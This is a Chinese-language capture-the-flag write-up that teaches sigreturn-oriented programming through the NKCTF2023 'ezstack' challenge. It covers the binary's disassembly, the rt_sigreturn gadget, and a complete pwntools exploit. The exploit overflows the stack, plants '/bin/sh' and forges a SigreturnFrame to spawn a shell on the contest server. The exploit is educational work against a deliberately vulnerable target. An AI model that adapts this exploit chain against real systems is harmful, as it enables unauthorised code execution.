# NKCTF2023ezstack - SROP初探


```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

鉴定为，没有保护。

核心代码很短：

```
.text:00000000004011B9 vuln            proc near               ; CODE XREF: main+17↓p
.text:00000000004011B9
.text:00000000004011B9 buf             = byte ptr -10h
.text:00000000004011B9
.text:00000000004011B9 ; __unwind {
.text:00000000004011B9                 endbr64
.text:00000000004011BD                 push    rbp
.text:00000000004011BE                 mov     rbp, rsp
.text:00000000004011C1                 mov     rax, 1
.text:00000000004011C8                 mov     rdx, 26h ; '&'  ; count
.text:00000000004011CF                 lea     rsi, nkctf      ; "Welcome to the binary world of NKCTF!\n"
.text:00000000004011D7                 mov     rdi, rax        ; fd
.text:00000000004011DA                 syscall                 ; LINUX - sys_write
.text:00000000004011DC                 xor     rax, rax
.text:00000000004011DF                 mov     rdx, 200h       ; count
.text:00000000004011E6                 lea     rsi, [rsp+buf]  ; buf
.text:00000000004011EB                 mov     rdi, rax        ; fd
.text:00000000004011EE                 syscall                 ; LINUX - sys_read
.text:00000000004011F0                 mov     eax, 0
.text:00000000004011F5                 pop     rbp
.text:00000000004011F6                 retn
.text:00000000004011F6 ; } // starts at 4011B9
.text:00000000004011F6 vuln            endp
```



一开始以为是ret2libc，本想想办法leak地址，发现无法控制rax为1调用输出的syscall。ROPgadget发现了一些奇怪的东西：

```
.text:0000000000401146                 mov     rax, 0Fh
.text:000000000040114D                 retn
.text:000000000040114E                 syscall                 ; LINUX -
.text:0000000000401150                 retn
```

查了一下，0x0F号系统调用是`rt_sigreturn`系统调用，推测可以使用SROP

SROP是一种利用Linux信号机制的漏洞利用方法。当用户发出信号请求时，会发生这样的事情：

保存上下文（在用户态栈上）→执行信号处理函数→从信号处理函数返回→从用户栈上恢复上下文

这里的问题在于这个过程中的最后一步是通过信号处理函数调用`rt_sigreturn`系统调用实现的，也就是说“从用户栈上恢复上下文”这个操作可以被攻击者直接执行。

也就是说，我们只需要在用户态栈上伪造一个上下文，然后调用`rt_sigreturn`让系统恢复上下文即可getshell。具体来说，我们按下面的规则在栈上伪造一个上下文：

```
rax=59
rdi = &/bin/sh
rsi = 0
rdx=0
rip=&syscall; ret
```

在调用`rt_sigreturn`时，系统会按上面的指分别设置各个寄存器，就可以执行execve("/bin/sh")了。

现在的问题是如何获得一个/bin/sh字符串。

发现程序中有一个输出`welcome to nkctf`的代码，如果我们在ret的时候ret到`0x4011c8`处，就可以跳过`mov rax, 1`的执行，此时rax为0，触发LINUX - read系统调用，此时我们可以在这个字符串内写入/bin/sh。

到这里思路就很明显了：

1. ret到`0x4011c8`处，写入`/bin/sh`字符串，然后触发第二次读入。
2. ret到vuln()起始地址，验证`/bin/sh`写入是否成功，同时准备写入SigreturnFrame（可跳过）
3. 控制ret地址为`mov rax, 15; ret; syscall; ret`，同时布置栈，写入伪造的SigreturnFrame。

完整exp：

```python
from pwn import *
elf = ELF("./ez_stack")

#p = process("./ez_stack")
p = remote("node2.yuzhian.com.cn", 39984)

context.arch = 'amd64'
context.log_level = 'debug'

p.recvuntil(b"NKCTF!\n")
leak_addr = 0x4011c8
vuln_addr = 0x4011b9
nkctf_addr = 0x404040
syscall_addr = 0x40114e
sigret_addr = 0x401146

payload = b"A" * (16+8)
payload += p64(leak_addr)#write nkctf_string
p.send(payload.ljust(0x200, b"A"))

#write /bin/sh
p.send(b"/bin/sh\x00"+b"a"*(0x26-8))
#try SROP
payload = b"a"*(16+8) + p64(vuln_addr)
p.send(payload)
p.recvuntil(b"/bin/sh\x00"+b"a"*(0x26-8))
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = nkctf_addr #&'/bin/sh'
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr
#print(frame)
frame = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@@@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00N\x11@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x003\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
payload = b'a'* (16+8)
payload += p64(sigret_addr) #强制sigreturn，改变frame
payload += p64(syscall_addr)
payload += frame
#payload += p64(vuln_addr)
p.send(payload)
p.interactive()
```


